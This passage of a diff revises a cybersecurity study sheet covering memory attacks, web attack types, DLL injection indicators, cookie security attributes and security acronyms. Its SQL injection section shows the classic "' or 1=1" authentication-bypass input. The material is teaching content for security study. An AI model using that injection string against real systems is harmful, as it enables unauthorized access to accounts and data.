-| EPP | Endpoint Protection Platform | Unified single-agent security suite |
-| DLP | Data Loss Prevention | Blocks unauthorized data exfiltration |
-| SCCM | System Center Configuration Manager | Enterprise patch management |
+| Buffer overflow | Input exceeds reserved buffer; overwrites adjacent memory | Stack return address → redirect execution |
+| Stack overflow | Specific case: overflow the call stack | Overwrite return address; inject shellcode via NOP sled |
+| Memory leak | Process fails to release memory | Resource exhaustion; potential DoS |
 
-### Attack Types
+### DLL Injection Indicators
 
-| Attack | Category | Root Cause | Mitigation |
+```
+- Legitimate process opens unexpected network connections
+- Process accesses files/registry keys outside its normal scope
+- Unusual parent/child process relationships
+```
+
+### Web Attack Quick Reference
+
+| Attack | Vector | Payload Location | Primary Impact |
 |---|---|---|---|
-| Buffer overflow | Overflow | No bounds checking on input | Input validation, ASLR, stack canaries |
-| Stack overflow | Overflow | Return address overwrite via buffer overflow | Same as above |
-| DLL injection | Memory | OS allows cross-process attachment | Process isolation, behavioral monitoring |
-| Memory leak | Resource exhaustion | Unreleased memory allocations | Code audits, process monitoring |
-| XSS (reflected) | Injection | No output encoding | Input sanitization, CSP headers |
-| XSS (persistent/stored) | Injection | No input sanitization on stored content | Same as reflected |
-| SQL injection | Injection | Unsanitized input concatenated into query | Parameterized queries, least-privilege DB |
-| Session hijacking | Replay | Stolen/guessed session token | Encrypt cookies, HttpOnly, new token on auth |
-| Replay attack | Token abuse | Reuse of valid session token | Short-lived tokens, nonces |
+| XSS (non-persistent) | Crafted URL | Reflected in server response | Cookie theft, credential capture |
+| XSS (persistent/stored) | Application content (posts, comments) | Stored in DB, served to all users | Mass cookie/credential theft |
+| SQLi | Input field / URL parameter | Injected into SQL query | DB dump, auth bypass, data manipulation |
+| Session hijacking | Cookie theft (sniffing) | Re-submitted token | Impersonate authenticated user |
+| Replay attack | Token theft or guess | Re-submitted session token | Unauthorized session access |
 
-### Cookie Security Attributes
+### SQL Injection Cheat Sheet
 
-```
-Secure   → HTTPS only
-HttpOnly → no JS access (blocks XSS token theft)
-SameSite → restricts cross-origin sending (blocks CSRF)
-```
+```sql
+-- Normal:
+SELECT * FROM tbl_user WHERE username = 'Bob'
 
-### iOS Encryption Layers
-
-```
-Layer 1: Always-on
-  Key stored on device
-  Purpose: instant wipe (delete key = data gone)
-
-Layer 2: Data Protection
-  Key derived from user credential
-  Scope: email + Data Protection apps
-  NOT applied to: contacts, SMS, photos
+-- Injected (' or 1=1):
+SELECT * FROM tbl_user WHERE username = '' or 1=1
+-- 1=1 is always TRUE → returns all rows → auth bypass
 ```
 
-### Privilege Escalation Flow
+### Secure Cookie Attributes
 
 ```
-Application vulnerability
-  → Attacker crafts malicious input
-    → Code executes at process privilege level
-      → Arbitrary code execution
-        → Backdoor install / DoS / lateral movement
+Secure   → HTTPS only; blocks plaintext transmission
+HttpOnly → no JavaScript access; blocks XSS cookie theft
+SameSite → restricts cross-origin cookie sending; blocks CSRF
 ```
 
 ### Must-Know Acronyms
 
 ```
-A-V     = Antivirus
-BYOD    = Bring Your Own Device
-COBO    = Corporate Owned, Business Only
-COPE    = Corporate Owned, Personally Enabled
-CSRF    = Cross-Site Request Forgery
-CSP     = Content Security Policy
-CYOD    = Choose Your Own Device
-DELETE  = SQL / HTTP method — remove data/resource
-DLL     = Dynamic Link Library
-DLP     = Data Loss Prevention
-DOM     = Document Object Model
-EMM     = Enterprise Mobility Management
-EPP     = Endpoint Protection Platform
-GET     = HTTP method — retrieve resource
-GPS     = Global Positioning System
-HEAD    = HTTP method — retrieve headers only
-HIDS    = Host-based Intrusion Detection System
-HIPS    = Host-based Intrusion Prevention System
-HTTP    = Hypertext Transfer Protocol
-IPS     = Indoor Positioning System (also Intrusion Prevention System)
-MAM     = Mobile Application Management
-MDM     = Mobile Device Management
-NOP     = No Operation (processor instruction; used in NOP sleds)
-PII     = Personally Identifiable Information
-POST    = HTTP method — send data for processing
-PUP     = Potentially Unwanted Program
-PUT     = HTTP method — create or replace resource
-RCE     = Remote Code Execution
-RFID    = Radio-Frequency Identification
-ROM     = Read-Only Memory
-RCE     = Remote Code Execution
-SCCM    = System Center Configuration Manager
-SELECT  = SQL — read data
-SQL     = Structured Query Language
-TLS     = Transport Layer Security
-URL     = Uniform Resource Locator
-XSS     = Cross-Site Scripting
+A-V    = Antivirus
+EPP    = Endpoint Protection Platform
+DLP    = Data Loss Prevention
+HIDS   = Host-based Intrusion Detection System
+HIPS   = Host-based Intrusion Prevention System
+SCCM   = System Center Configuration Manager (Microsoft)
+EMM    = Enterprise Mobility Management
+MDM    = Mobile Device Management
+MAM    = Mobile Application Management
+BYOD   = Bring Your Own Device
+COBO   = Corporate Owned, Business Only
+COPE   = Corporate Owned, Personally-Enabled
+CYOD   = Choose Your Own Device
+AUP    = Acceptable Use Policy
+GPS    = Global Positioning System
+IPS    = Indoor Positioning System (context: mobile; not Intrusion Prevention)
+ROM    = Read-Only Memory (context: custom ROM = custom Android firmware)
+RCE    = Remote Code Execution
+ACE    = Arbitrary Code Execution
+DLL    = Dynamic Link Library
+NOP    = No Operation (CPU instruction; used in NOP sleds for buffer overflow exploits)
+URL    = Uniform Resource Locator
+HTTP   = Hypertext Transfer Protocol
+XSS    = Cross-Site Scripting
+SQLi   = SQL Injection
+SQL    = Structured Query Language
+CSRF   = Cross-Site Request Forgery
+DOM    = Document Object Model
+PUP    = Potentially Unwanted Program
+CVE    = Common Vulnerabilities and Exposures
+OWASP  = Open Web Application Security Project
 ```
